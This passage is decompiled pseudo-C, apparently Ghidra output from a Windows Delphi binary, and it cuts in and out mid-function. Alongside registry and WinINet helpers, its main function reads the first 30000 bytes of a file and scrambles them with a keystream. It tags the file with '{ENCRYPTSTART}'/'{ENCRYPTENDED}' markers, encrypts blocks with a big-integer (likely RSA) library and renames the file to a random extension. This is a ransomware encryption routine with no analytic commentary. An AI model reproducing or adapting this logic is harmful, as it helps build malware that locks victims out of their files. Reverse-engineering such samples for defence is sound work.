    FUN_00434884(param_1,local_c,&local_10->nLength);
  }
  *in_FS_OFFSET = lpSecurityAttributes;
  FUN_004047a8((int *)&local_10);
  return;
}



void FUN_00434ac0(int param_1,undefined *param_2,undefined *param_3)

{
  int iVar1;
  DWORD DVar2;
  BYTE *pBVar3;
  char cVar4;
  
  iVar1 = FUN_00404a68((int)param_3);
  DVar2 = iVar1 + 1;
  cVar4 = '\x01';
  pBVar3 = FUN_00404c68(param_3);
  FUN_00434aec(param_1,param_2,pBVar3,cVar4,DVar2);
  return;
}



void FUN_00434aec(int param_1,undefined *param_2,BYTE *param_3,char param_4,DWORD param_5)

{
  DWORD dwType;
  LPCSTR lpValueName;
  LSTATUS LVar1;
  int iVar2;
  DWORD Reserved;
  BYTE *lpData;
  undefined *local_10;
  undefined local_c;
  BYTE *local_8;
  
  local_8 = param_3;
  dwType = FUN_0043474c(param_4);
  Reserved = 0;
  lpData = local_8;
  lpValueName = FUN_00404c68(param_2);
  LVar1 = RegSetValueExA(*(HKEY *)(param_1 + 4),lpValueName,Reserved,dwType,lpData,param_5);
  if (LVar1 != 0) {
    local_c = 0xb;
    local_10 = param_2;
    iVar2 = FUN_0040b9b4((int)&DAT_00434650,'\x01',(int **)PTR_PTR_DAT_004414a4,0,&local_10);
    FUN_00404208(iVar2);
  }
  return;
}



void FUN_00434b54(int param_1,int param_2)

{
  undefined4 uVar1;
  LPCSTR lpSubKey;
  HKEY hKey;
  undefined4 *in_FS_OFFSET;
  DWORD ulOptions;
  REGSAM samDesired;
  HKEY *phkResult;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  char *local_c;
  HKEY local_8;
  
  puStack24 = &stack0xfffffffc;
  local_c = (char *)0x0;
  puStack28 = &LAB_00434bda;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  FUN_00404840((int *)&local_c,param_2);
  uVar1 = FUN_00434738(local_c);
  if ((char)uVar1 == '\0') {
    FUN_00404d08((int *)&local_c,1,1);
  }
  local_8 = (HKEY)0x0;
  phkResult = &local_8;
  samDesired = *(REGSAM *)(param_1 + 0x18);
  ulOptions = 0;
  lpSubKey = FUN_00404c68(local_c);
  hKey = (HKEY)FUN_004348a8(param_1,(char)uVar1);
  RegOpenKeyExA(hKey,lpSubKey,ulOptions,samDesired,phkResult);
  *in_FS_OFFSET = uStack32;
  puStack24 = &LAB_00434be1;
  puStack28 = (undefined *)0x434bd9;
  FUN_004047a8((int *)&local_c);
  return;
}



int * FUN_00434bec(int *param_1,char param_2,undefined4 *param_3)

{
  undefined4 *extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00434c28(param_1,'\0',param_3,0xf003f);
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



int * FUN_00434c28(int *param_1,char param_2,undefined4 *param_3,int param_4)

{
  undefined4 *extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe0;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe0,in_stack_ffffffe4,
                                  in_stack_ffffffe8,in_stack_ffffffec);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_004347c0(param_1,'\0',param_4);
  FUN_004047fc(param_1 + 7,param_3);
  FUN_0043499c((int)param_1,(int)param_3,'\x01');
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe0;
  }
  return param_1;
}



void FUN_00434c80(int param_1,int param_2,undefined *param_3,undefined *param_4)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack48;
  undefined *puStack44;
  undefined *puStack40;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  
  puStack28 = (undefined *)0x434c99;
  FUN_004348c0(param_1,param_2);
  puStack28 = (undefined *)0x434ca3;
  iVar2 = FUN_00434b54(param_1,param_2);
  if (iVar2 != 0) {
    puStack32 = &LAB_00434d20;
    uStack36 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack36;
    uVar1 = *(undefined4 *)(param_1 + 4);
    puStack40 = (undefined *)0x434cce;
    puStack28 = &stack0xfffffffc;
    FUN_004348bc(param_1,iVar2);
    puStack44 = &LAB_00434d02;
    uStack48 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack48;
    puStack40 = &stack0xfffffffc;
    FUN_00434ac0(param_1,param_3,param_4);
    *in_FS_OFFSET = uStack48;
    puStack40 = &LAB_00434d09;
    puStack44 = (undefined *)0x434d01;
    FUN_004348bc(param_1,uVar1);
    return;
  }
  return;
}



void InternetCloseHandle(void)

{
                    // WARNING: Could not recover jumptable at 0x00434d98. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetCloseHandle();
  return;
}



void InternetOpenA(void)

{
                    // WARNING: Could not recover jumptable at 0x00434da0. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetOpenA();
  return;
}



void InternetOpenUrlA(void)

{
                    // WARNING: Could not recover jumptable at 0x00434da8. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetOpenUrlA();
  return;
}



void InternetReadFile(void)

{
                    // WARNING: Could not recover jumptable at 0x00434db0. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetReadFile();
  return;
}



void FUN_00434df0(int param_1,byte *param_2,uint *param_3)

{
  byte bVar1;
  byte bVar2;
  byte *pbVar3;
  int iVar4;
  byte bVar5;
  undefined4 *in_FS_OFFSET;
  undefined uVar6;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  uint *local_c;
  byte *local_8;
  
  puStack24 = (undefined *)0x434e08;
  local_c = param_3;
  local_8 = param_2;
  FUN_00404c58((int)param_2);
  puStack24 = (undefined *)0x434e10;
  FUN_00404c58((int)local_c);
  puStack28 = &LAB_00435077;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  uVar6 = true;
  puStack24 = &stack0xfffffffc;
  FUN_00404bb4(local_c,(uint *)&DAT_00435090);
  bVar5 = (byte)param_1;
  if ((bool)uVar6) {
    bVar1 = *local_8;
    if ((int)((uint)bVar1 + param_1) < 0x100) {
      uVar6 = (byte)(bVar5 + bVar1) == '\0';
    }
    else {
      uVar6 = (byte)(bVar5 + bVar1) == '\0';
    }
  }
  FUN_00404bb4(local_c,(uint *)&DAT_0043509c);
  if ((bool)uVar6) {
    bVar1 = *local_8;
    iVar4 = param_1 - (uint)bVar1;
    if (iVar4 == -1 || SCARRY4(iVar4,1) != iVar4 + 1 < 0) {
      uVar6 = bVar5 == bVar1;
    }
    else {
      uVar6 = bVar5 == bVar1;
    }
  }
  FUN_00404bb4(local_c,(uint *)&DAT_004350a8);
  if ((bool)uVar6) {
    bVar1 = *local_8;
    bVar2 = *(byte *)local_c;
    if ((int)((uint)bVar1 + param_1 + (uint)bVar2) < 0x100) {
      uVar6 = (byte)(bVar5 + bVar1 + bVar2) == '\0';
    }
    else {
      uVar6 = (byte)(bVar5 + bVar1 + bVar2) == '\0';
    }
  }
  FUN_00404bb4(local_c,(uint *)&DAT_004350b4);
  if ((bool)uVar6) {
    pbVar3 = FUN_00408178((byte *)local_c);
    if ((int)(pbVar3 + (uint)*local_8 + param_1) < 0x100) {
      pbVar3 = FUN_00408178((byte *)local_c);
      uVar6 = (byte)((char)pbVar3 + bVar5 + *local_8) == '\0';
    }
    else {
      pbVar3 = FUN_00408178((byte *)local_c);
      uVar6 = (byte)((char)pbVar3 + bVar5 + *local_8) == '\0';
    }
  }
  FUN_00404bb4(local_c,(uint *)&DAT_004350c0);
  if ((bool)uVar6) {
    bVar1 = *local_8;
    bVar2 = *(byte *)local_c;
    iVar4 = (param_1 - (uint)bVar1) - (uint)bVar2;
    if (iVar4 == -1 || SCARRY4(iVar4,1) != iVar4 + 1 < 0) {
      uVar6 = (byte)(bVar5 - bVar1) == bVar2;
    }
    else {
      uVar6 = (byte)(bVar5 - bVar1) == bVar2;
    }
  }
  FUN_00404bb4(local_c,(uint *)&DAT_004350cc);
  if ((bool)uVar6) {
    pbVar3 = FUN_00408178((byte *)local_c);
    iVar4 = (param_1 - (uint)*local_8) - (int)pbVar3;
    if (iVar4 == -1 || SCARRY4(iVar4,1) != iVar4 + 1 < 0) {
      pbVar3 = FUN_00408178((byte *)local_c);
      uVar6 = (byte)(bVar5 - *local_8) == (char)pbVar3;
    }
    else {
      pbVar3 = FUN_00408178((byte *)local_c);
      uVar6 = (byte)(bVar5 - *local_8) == (char)pbVar3;
    }
  }
  FUN_00404bb4(local_c,(uint *)&DAT_004350d8);
  if ((bool)uVar6) {
    pbVar3 = FUN_00408178((byte *)local_c);
    if ((int)(pbVar3 + param_1) < 0x100) {
      pbVar3 = FUN_00408178((byte *)local_c);
      uVar6 = (byte)((char)pbVar3 + bVar5) == '\0';
    }
    else {
      pbVar3 = FUN_00408178((byte *)local_c);
      uVar6 = (byte)((char)pbVar3 + bVar5) == '\0';
    }
  }
  FUN_00404bb4(local_c,(uint *)&DAT_004350e4);
  if ((bool)uVar6) {
    pbVar3 = FUN_00408178((byte *)local_c);
    iVar4 = param_1 - (int)pbVar3;
    if (iVar4 == -1 || SCARRY4(iVar4,1) != iVar4 + 1 < 0) {
      FUN_00408178((byte *)local_c);
    }
    else {
      FUN_00408178((byte *)local_c);
    }
  }
  FUN_00404bb4(local_c,(uint *)&DAT_004350f0);
  FUN_00404bb4(local_c,(uint *)&DAT_004350fc);
  *in_FS_OFFSET = uStack32;
  puStack24 = &LAB_0043507e;
  puStack28 = (undefined *)0x435076;
  FUN_004047cc((int *)&local_c,2);
  return;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_00435100(undefined *param_1,uint param_2,undefined param_3,undefined4 param_4,
                 undefined4 param_5,uint param_6,int param_7,uint *param_8)

{
  byte bVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  undefined extraout_CL;
  int iVar6;
  undefined extraout_DL;
  int *extraout_EDX;
  int extraout_EDX_00;
  int extraout_EDX_01;
  int *extraout_EDX_02;
  byte *pbVar7;
  uint *puVar8;
  int **ppiVar9;
  int **in_FS_OFFSET;
  undefined uVar10;
  undefined *local_7e24;
  undefined4 *local_7e20;
  undefined4 *local_7e1c;
  int local_7e18;
  int local_7e14;
  int local_7e10;
  int local_7e0c;
  int local_7e08;
  int local_7e04;
  int local_7e00;
  int local_7dfc;
  byte *local_7df8;
  uint *local_7df4;
  undefined4 *local_7df0;
  undefined4 *local_7dec;
  undefined4 *local_7de8;
  undefined4 *local_7de4;
  int *local_7de0;
  byte local_7ddc [16];
  int local_7dcc;
  int local_7dc8;
  int local_7dc4;
  undefined4 local_7dc0;
  undefined local_7dbc;
  undefined local_7dbb;
  int local_7db8 [3];
  int *local_7dac [3];
  uint local_7da0 [512];
  byte local_75a0 [29872];
  undefined4 uStackY240;
  int *piStack232;
  undefined *puStack228;
  undefined *puStack224;
  undefined *puStack220;
  int *piStack216;
  char *pcStack212;
  uint *puStack208;
  undefined *puStack204;
  int *piVar11;
  int **local_70;
  uint local_6c;
  uint *local_68;
  undefined4 uStack100;
  int *local_60;
  uint local_5c;
  undefined *local_58;
  int *local_54;
  int iStack80;
  int local_4c;
  int *piStack72;
  undefined4 *******local_44;
  int **local_40;
  int *piStack56;
  undefined1 *local_34;
  undefined *local_30;
  int *local_2c;
  undefined4 uStack40;
  int *local_24;
  int local_10;
  uint local_c;
  undefined *local_8;
  
  local_30 = &stack0xfffffffc;
  iVar6 = 0xfc3;
  do {
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  local_10 = 0;
  local_24 = (int *)0x435138;
  local_c = param_2;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  local_24 = (int *)0x435140;
  FUN_00404c58(local_c);
  local_24 = (int *)0x435148;
  FUN_00404c58(local_10);
  local_24 = (int *)0x435150;
  FUN_00404c58((int)param_8);
  local_24 = (int *)0x435158;
  FUN_00404c58(param_7);
  local_24 = (int *)0x435160;
  FUN_00404c58(param_6);
  local_24 = (int *)0x43516e;
  FUN_00405314((int)&stack0xffffffe8,(int)&DAT_00415450);
  local_24 = (int *)0x43517c;
  FUN_00405314((int)&stack0xffffffe0,(int)&DAT_00415450);
  local_24 = (int *)0x435192;
  FUN_00405130(local_7dac,&DAT_00401034,3);
  local_2c = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_2c;
  uStack40 = &LAB_00435dd5;
  local_34 = &DAT_00435d27;
  piStack56 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&piStack56;
  local_24 = (int *)&stack0xfffffffc;
  FUN_004047a8((int *)&local_2c);
  local_40 = (int **)0x4351cb;
  local_24 = FUN_0041382c((int *)&PTR_LAB_00411270,'\x01',local_8,2);
  uStack40 = (undefined *)CONCAT13(1,(undefined3)uStack40);
  (**(code **)*local_24)();
  local_7dbb = *local_8;
  local_7dbc = 1;
  piStack56 = extraout_EDX;
  FUN_00402f50(&local_7dc0,(undefined4 *)&local_7dbc);
  FUN_00402f20((byte *)&local_7dc0,&DAT_00435de8,2);
  FUN_00404a0c((int *)&local_58,(byte *)&local_7dc0);
  piVar5 = &local_4c;
  local_40 = &local_54;
  local_44 = &local_44;
  piStack72 = (int *)0x435235;
  piStack72 = (int *)FUN_00404c68(local_58);
  local_4c = 0x43523f;
  (**(code **)PTR_DAT_00441464)();
  local_4c = 0x435246;
  iVar6 = (**(code **)*local_24)();
  if (extraout_EDX_00 == 0 && iVar6 == 0) goto LAB_00435d0f;
  if (local_40 == (int **)(uint)(local_44 < (undefined4 *******)0x3c000)) {
    if (local_44 == (undefined4 *******)0x3c000) goto LAB_00435d0f;
  }
  else if ((int)local_40 - (int)(int **)(uint)(local_44 < (undefined4 *******)0x3c000) < 1)
  goto LAB_00435d0f;
  uVar10 = piStack56 == (int *)0x0;
  if ((bool)uVar10) {
    uVar10 = piVar5 == (int *)0xe;
    if ((int *)0xe < piVar5) goto LAB_00435292;
LAB_00435288:
    local_4c = 0x435290;
    FUN_004047a8((int *)&local_68);
  }
  else {
    if ((int)piStack56 < 1) goto LAB_00435288;
LAB_00435292:
    local_4c = 0x43529f;
    FUN_00404d98((int *)&local_68,0xe);
    iStack80 = (int)piVar5 + -0xe;
    local_4c = (int)piStack56 - (uint)(piVar5 < (int *)0xe);
    uVar10 = 1;
    local_54 = (int *)0x4352b7;
    (**(code **)(*local_24 + 0x18))();
    local_4c = 0x4352bf;
    iVar6 = thunk_FUN_00404c74((int *)&local_68);
    local_4c = 0x4352ce;
    FUN_00413604(local_24,iVar6,0xe);
  }
  local_4c = 0x4352db;
  FUN_00404bb4(local_68,(uint *)"{ENCRYPTENDED}");
  if ((bool)uVar10) goto LAB_00435d0f;
  local_4c = 0;
  iStack80 = 0;
  local_54 = (int *)0x4352ef;
  (**(code **)(*local_24 + 0x18))(local_24,0);
  local_54 = (int *)0x4352f6;
  uVar2 = (**(code **)*local_24)();
  if (extraout_EDX_01 == 0) {
    if (30000 < uVar2) goto LAB_0043531f;
LAB_00435306:
    local_54 = (int *)0x43530d;
    iVar6 = (**(code **)*local_24)();
    local_54 = (int *)0x43531d;
    FUN_00413604(local_24,local_75a0,iVar6);
  }
  else {
    if (extraout_EDX_01 < 1) goto LAB_00435306;
LAB_0043531f:
    local_54 = (int *)0x435332;
    FUN_00413604(local_24,local_75a0,30000);
  }
  local_54 = (int *)0x43533f;
  FUN_00404840((int *)&local_2c,(int)"{ENCRYPTSTART}");
  local_54 = local_2c;
  local_58 = &DAT_00435e24;
  local_5c = DAT_00443390;
  local_60 = (int *)&DAT_00435e30;
  uStack100 = &DAT_00435e24;
  local_68 = param_8;
  FUN_00408128(&local_7dc4,extraout_DL,extraout_CL,(char)piVar5);
  FUN_00408870(local_8,&local_7dc8);
  FUN_00404b28(&local_7de0,3);
  FUN_0041532c((undefined *)local_7de0,(int)local_7ddc);
  FUN_004152b8(local_7ddc,&local_7dcc);
  FUN_00404b28(&local_2c,0xf);
  FUN_004047a8((int *)&local_30);
  iVar6 = 0x200;
  puVar8 = local_7da0;
  do {
    FUN_004029e8();
    iVar3 = FUN_004030c0(0x800);
    *puVar8 = iVar3 + 1U;
    FUN_00404990((int *)&local_7de4,
                 local_c & 0xffffff00 | (uint)*(byte *)((local_c - 1) + iVar3 + 1U));
    FUN_00404a70((int *)&local_30,local_7de4);
    puVar8 = puVar8 + 1;
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  FUN_004047a8((int *)&local_34);
  while (iVar6 = FUN_00404a68((int)local_34), iVar6 < 30000) {
    FUN_0041532c(local_30,(int)local_7ddc);
    FUN_004152b8(local_7ddc,(int *)&local_7de8);
    FUN_00404a70((int *)&local_34,local_7de8);
    iVar6 = 1;
    do {
      if ((byte)local_30[iVar6 + -1] + 0x80 < 0x100) {
        iVar3 = thunk_FUN_00404c74((int *)&local_30);
        *(char *)(iVar3 + -1 + iVar6) = local_30[iVar6 + -1] + -0x80;
      }
      else {
        iVar3 = thunk_FUN_00404c74((int *)&local_30);
        *(char *)(iVar3 + -1 + iVar6) = local_30[iVar6 + -1] + -0x80;
      }
      iVar6 = iVar6 + 1;
    } while (iVar6 != 0x201);
    FUN_0041532c(local_30,(int)local_7ddc);
    FUN_004152b8(local_7ddc,(int *)&local_7dec);
    FUN_00404a70((int *)&local_34,local_7dec);
    iVar6 = 2;
    do {
      if ((uint)(byte)local_30[iVar6 + -2] + (uint)(byte)local_30[iVar6 + -1] < 0x100) {
        iVar3 = thunk_FUN_00404c74((int *)&local_30);
        *(undefined *)(iVar3 + -2 + iVar6) = local_30[iVar6 + -2] + local_30[iVar6 + -1];
      }
      else {
        iVar3 = thunk_FUN_00404c74((int *)&local_30);
        *(undefined *)(iVar3 + -2 + iVar6) = local_30[iVar6 + -2] + local_30[iVar6 + -1];
      }
      iVar6 = iVar6 + 1;
    } while (iVar6 != 0x201);
    FUN_0041532c(local_30,(int)local_7ddc);
    FUN_004152b8(local_7ddc,(int *)&local_7df0);
    FUN_00404a70((int *)&local_34,local_7df0);
    iVar6 = 1;
    do {
      if ((uint)(byte)local_30[iVar6 + -1] * 2 < 0x100) {
        iVar3 = thunk_FUN_00404c74((int *)&local_30);
        *(char *)(iVar3 + -1 + iVar6) = local_30[iVar6 + -1] * '\x02';
      }
      else {
        iVar3 = thunk_FUN_00404c74((int *)&local_30);
        *(char *)(iVar3 + -1 + iVar6) = local_30[iVar6 + -1] * '\x02';
      }
      iVar6 = iVar6 + 1;
    } while (iVar6 != 0x201);
  }
  iVar3 = 1;
  iVar6 = 1;
  pbVar7 = local_75a0;
  do {
    FUN_00404990((int *)&local_7df4,param_6 & 0xffffff00 | (uint)*(byte *)((param_6 - 1) + iVar3));
    puVar8 = local_7df4;
    FUN_00404990((int *)&local_7df8,(uint)local_34 & 0xffffff00 | (uint)(byte)local_34[iVar6 + -1]);
    bVar1 = FUN_00434df0((uint)*pbVar7,local_7df8,puVar8);
    *pbVar7 = bVar1;
    iVar3 = iVar3 + 1;
    iVar4 = FUN_00404a68(param_6);
    if (iVar4 < iVar3) {
      iVar3 = 1;
    }
    iVar6 = iVar6 + 1;
    pbVar7 = pbVar7 + 1;
  } while (iVar6 != 0x7531);
  (**(code **)(*local_24 + 0x18))(local_24,0);
  if (piStack56 == (int *)0x0) {
    if ((int *)0x7530 < piVar5) goto LAB_00435682;
LAB_0043566f:
    FUN_0041363c(local_24,local_75a0,(int)piVar5);
  }
  else {
    if ((int)piStack56 < 1) goto LAB_0043566f;
LAB_00435682:
    FUN_0041363c(local_24,local_75a0,30000);
  }
  iVar6 = 0x200;
  puVar8 = local_7da0;
  do {
    FUN_0040803c(*puVar8,&local_7dfc);
    FUN_00404b28(&local_2c,4);
    puVar8 = puVar8 + 1;
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  FUN_00404a70((int *)&local_2c,(undefined4 *)"{BLOCKSSTART}");
  if (piStack56 == (int *)0x0) {
    if ((int *)0x7530 < piVar5) {
LAB_004356fb:
      local_5c = FUN_00402a10();
      if ((int)local_5c < 4) {
        (**(code **)(*local_24 + 0x18))(local_24,0);
        if (0 < (int)local_5c) {
          local_6c = local_5c;
          iVar6 = 1;
          ppiVar9 = local_7dac;
          do {
            FUN_00404d98((int *)ppiVar9,0x400);
            iVar3 = thunk_FUN_00404c74((int *)ppiVar9);
            FUN_00413604(local_24,iVar3,0x400);
            FUN_00418090((int)*ppiVar9,(int)&stack0xffffffe8,&stack0xffffffe0,(int *)ppiVar9);
            FUN_0040803c(iVar6 - 1,&local_7e00);
            uVar2 = FUN_00404a68((int)*ppiVar9);
            FUN_0040803c(uVar2,&local_7e04);
            FUN_00404b28(&local_2c,6);
            iVar3 = FUN_00404a68((int)*ppiVar9);
            if (iVar3 < 0x401) {
              FUN_00404a70((int *)&local_2c,(undefined4 *)&DAT_00435e64);
            }
            else {
              piVar5 = &local_7e08;
              puStack204 = (undefined *)0x4357dc;
              uVar2 = FUN_00404a68((int)*ppiVar9);
              puStack204 = (undefined *)0x4357ea;
              FUN_00404cc8((int)*ppiVar9,0x401,uVar2,piVar5);
              puStack208 = (uint *)0x435802;
              FUN_00404b28(&local_2c,4);
            }
            iVar6 = iVar6 + 1;
            ppiVar9 = ppiVar9 + 1;
            local_6c = local_6c - 1;
          } while (local_6c != 0);
        }
        if (0 < (int)local_5c) {
          local_6c = local_5c;
          ppiVar9 = local_7dac;
          do {
            (**(code **)(*local_24 + 0x18))(local_24,0);
            iVar6 = FUN_00404a68((int)*ppiVar9);
            if (iVar6 < 0x401) {
              FUN_0041363c(local_24,&DAT_00442f7c,0x400);
              (**(code **)(*local_24 + 0x18))(local_24,0);
              iVar6 = FUN_00404a68((int)*ppiVar9);
              iVar3 = thunk_FUN_00404c74((int *)ppiVar9);
              FUN_0041363c(local_24,iVar3,iVar6);
            }
            else {
              iVar6 = thunk_FUN_00404c74((int *)ppiVar9);
              FUN_0041363c(local_24,iVar6,0x400);
            }
            ppiVar9 = ppiVar9 + 1;
            local_6c = local_6c - 1;
          } while (local_6c != 0);
        }
      }
      else {
        FUN_004029e8();
        iVar6 = FUN_004030c0(local_5c);
        local_7db8[0] = iVar6 + 1;
        iVar6 = 2;
        piVar5 = local_7db8;
        do {
          piVar5 = piVar5 + 1;
          uStack100 = (undefined *)((uint)uStack100 & 0xffffff);
          do {
            uStack100 = (undefined *)CONCAT13(1,(undefined3)uStack100);
            FUN_004029e8();
            iVar3 = FUN_004030c0(local_5c);
            *piVar5 = iVar3 + 1;
            local_6c = iVar6 + -1;
            if (0 < (int)local_6c) {
              local_70 = (int **)local_7db8;
              do {
                if (*local_70 == (int *)*piVar5) {
                  uStack100 = (undefined *)((uint)uStack100 & 0xffffff);
                }
                local_70 = local_70 + 1;
                local_6c = local_6c + -1;
              } while (local_6c != 0);
            }
          } while (uStack100._3_1_ == '\0');
          iVar6 = iVar6 + 1;
        } while (iVar6 != 4);
        iVar6 = 3;
        piVar5 = local_7db8;
        local_70 = local_7dac;
        do {
          (**(code **)(*local_24 + 0x18))(local_24,0);
          FUN_00404d98((int *)local_70,0x400);
          iVar3 = thunk_FUN_00404c74((int *)local_70);
          FUN_00413604(local_24,iVar3,0x400);
          FUN_00418090((int)*local_70,(int)&stack0xffffffe8,&stack0xffffffe0,(int *)local_70);
          FUN_0040803c(*piVar5 - 1,&local_7e0c);
          uVar2 = FUN_00404a68((int)*local_70);
          FUN_0040803c(uVar2,&local_7e10);
          FUN_00404b28(&local_2c,6);
          iVar3 = FUN_00404a68((int)*local_70);
          if (iVar3 < 0x401) {
            FUN_00404a70((int *)&local_2c,(undefined4 *)&DAT_00435e64);
          }
          else {
            piVar11 = &local_7e14;
            uVar2 = FUN_00404a68((int)*local_70);
            FUN_00404cc8((int)*local_70,0x401,uVar2,piVar11);
            FUN_00404b28(&local_2c,4);
          }
          local_70 = local_70 + 1;
          piVar5 = piVar5 + 1;
          iVar6 = iVar6 + -1;
        } while (iVar6 != 0);
        iVar6 = 3;
        ppiVar9 = local_7dac;
        do {
          (**(code **)(*local_24 + 0x18))(local_24,0);
          iVar3 = FUN_00404a68((int)*ppiVar9);
          if (iVar3 < 0x401) {
            FUN_0041363c(local_24,&DAT_00442f7c,0x400);
            (**(code **)(*local_24 + 0x18))(local_24,0);
            iVar3 = FUN_00404a68((int)*ppiVar9);
            iVar4 = thunk_FUN_00404c74((int *)ppiVar9);
            FUN_0041363c(local_24,iVar4,iVar3);
          }
          else {
            iVar3 = thunk_FUN_00404c74((int *)ppiVar9);
            FUN_0041363c(local_24,iVar3,0x400);
          }
          ppiVar9 = ppiVar9 + 1;
          iVar6 = iVar6 + -1;
        } while (iVar6 != 0);
      }
    }
  }
  else if (0 < (int)piStack56) goto LAB_004356fb;
  FUN_00404a70((int *)&local_2c,(undefined4 *)"{BLOCKSEND}");
  uVar2 = FUN_00404a68((int)local_2c);
  FUN_0040803c(uVar2,&local_7e18);
  FUN_00404b28(&local_2c,4);
  (**(code **)(*local_24 + 0x18))(local_24,0);
  iVar6 = FUN_00404a68((int)local_2c);
  iVar3 = thunk_FUN_00404c74((int *)&local_2c);
  FUN_0041363c(local_24,iVar3,iVar6);
  uStack40 = (undefined *)((uint)uStack40 & 0xffffff);
  FUN_00403b24(local_24);
  FUN_004047a8((int *)&local_60);
  iVar6 = 0x1e;
  do {
    FUN_004029e8();
    uVar2 = FUN_004030c0(0x1a);
    FUN_00404990((int *)&local_7e1c,uVar2 & 0xffffff00 | (uint)(byte)((char)uVar2 + 0x41));
    FUN_00404a70((int *)&local_60,local_7e1c);
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  FUN_00404a70((int *)&local_60,(undefined4 *)&DAT_00435e9c);
  iVar6 = 3;
  do {
    FUN_004029e8();
    uVar2 = FUN_004030c0(0x1a);
    FUN_00404990((int *)&local_7e20,uVar2 & 0xffffff00 | (uint)(byte)((char)uVar2 + 0x41));
    FUN_00404a70((int *)&local_60,local_7e20);
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  puStack204 = &DAT_00435ec8;
  puStack208 = param_8;
  pcStack212 = ".randomname-";
  piStack216 = local_60;
  puStack220 = &DAT_00435ef0;
  puStack224 = (undefined *)0x435c1f;
  FUN_00404b28(&local_60,9);
  puStack228 = &LAB_00435cf7;
  piStack232 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&piStack232;
  uStackY240 = 0x435c3e;
  puStack224 = &stack0xfffffffc;
  local_24 = FUN_0041382c((int *)&PTR_LAB_00411270,'\x01',local_8,2);
  uStack40 = (undefined *)CONCAT13(1,(undefined3)uStack40);
  piVar5 = (int *)(**(code **)*local_24)();
  uVar10 = extraout_EDX_02 == (int *)0x0;
  if ((bool)uVar10) {
    uVar10 = piVar5 == (int *)0xe;
    if ((int *)0xe < piVar5) goto LAB_00435c6c;
LAB_00435c62:
    local_58 = (undefined *)0x435c6a;
    FUN_004047a8((int *)&local_68);
  }
  else {
    if ((int)extraout_EDX_02 < 1) goto LAB_00435c62;
LAB_00435c6c:
    local_58 = (undefined *)0x435c79;
    piStack56 = extraout_EDX_02;
    FUN_00404d98((int *)&local_68,0xe);
    local_5c = (int)piVar5 - 0xe;
    local_58 = (undefined *)((int)piStack56 - (uint)(piVar5 < (int *)0xe));
    uVar10 = 1;
    local_60 = (int *)0x435c91;
    (**(code **)(*local_24 + 0x18))();
    local_58 = (undefined *)0x435c99;
    iVar6 = thunk_FUN_00404c74((int *)&local_68);
    local_58 = (undefined *)0x435ca8;
    FUN_00413604(local_24,iVar6,0xe);
  }
  local_58 = (undefined *)0x435cb0;
  FUN_00403b24(local_24);
  uStack40 = (undefined *)((uint)uStack40 & 0xffffff);
  local_58 = (undefined *)0x435cc1;
  FUN_00404bb4(local_68,(uint *)"{ENCRYPTENDED}");
  if ((bool)uVar10) {
    local_58 = (undefined *)0x435cd1;
    FUN_0040883c(local_8,(int *)&local_7e24);
    local_58 = (undefined *)0x435cdf;
    FUN_00404a70((int *)&local_7e24,local_60);
    local_58 = (undefined *)0x435ced;
    FUN_00408734(local_8,local_7e24);
  }
  *in_FS_OFFSET = local_54;
LAB_00435d0f:
  if (uStack40._3_1_ == '\x01') {
    local_4c = 0x435d1d;
    FUN_00403b24(local_24);
  }
  *in_FS_OFFSET = piStack72;
  *in_FS_OFFSET = piVar5;
  local_34 = &LAB_00435ddf;
  piStack56 = (int *)0x435d5c;
  FUN_004047cc((int *)&local_7e24,0x12);
  piStack56 = (int *)0x435d6c;
  FUN_004047cc(&local_7dcc,3);
  piStack56 = (int *)0x435d82;
  FUN_0040521c(local_7dac,&DAT_00401034,3);
  piStack56 = (int *)0x435d8a;
  FUN_004047a8((int *)&local_68);
  piStack56 = (int *)0x435d92;
  FUN_004047a8((int *)&local_60);
  piStack56 = (int *)0x435d9a;
  FUN_004047a8((int *)&local_58);
  piStack56 = (int *)0x435da7;
  FUN_004047cc((int *)&local_34,3);
  piStack56 = (int *)0x435dba;
  FUN_0040521c((int **)&stack0xffffffe0,"\x0e\x06TFGInt\b",2);
  piStack56 = (int *)0x435dc7;
